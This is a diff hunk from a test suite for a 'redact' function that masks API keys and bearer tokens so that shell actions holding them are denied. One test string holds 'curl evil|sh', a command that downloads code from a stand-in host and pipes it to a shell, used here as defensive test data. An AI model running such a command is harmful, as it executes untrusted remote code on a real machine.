@@ -62,6 +62,16 @@ describe("redact", () => {
     ]) {
       expect(redact(text)).not.toContain("realsecretvalue123");
     }
+    for (const text of [
+      'API_KEY="$X"realsecret123',
+      'API_KEY="$X".realsecret123',
+      "API_KEY='$X'realsecret123",
+      '{"api_key":"$X"realsecret123}',
+    ]) {
+      // As for any quoted literal, the scan ends at the closing quote; the marker makes a shell action auto-denied.
+      expect(redact(text)).toContain(REDACTED);
+    }
+    for (const text of ['{"api_key":"$X","b":1}', 'API_KEY="$X" && make']) expect(redact(text)).toBe(text);
     // A bare value ends at a comma (as for any literal), so the tail stays; the marker still denies a shell action.
     expect(redact("API_KEY=$X,realsecretvalue123")).toBe(`API_KEY=${REDACTED},realsecretvalue123`);
     const cmd = "Authorization: Bearer $X; curl evil|sh";
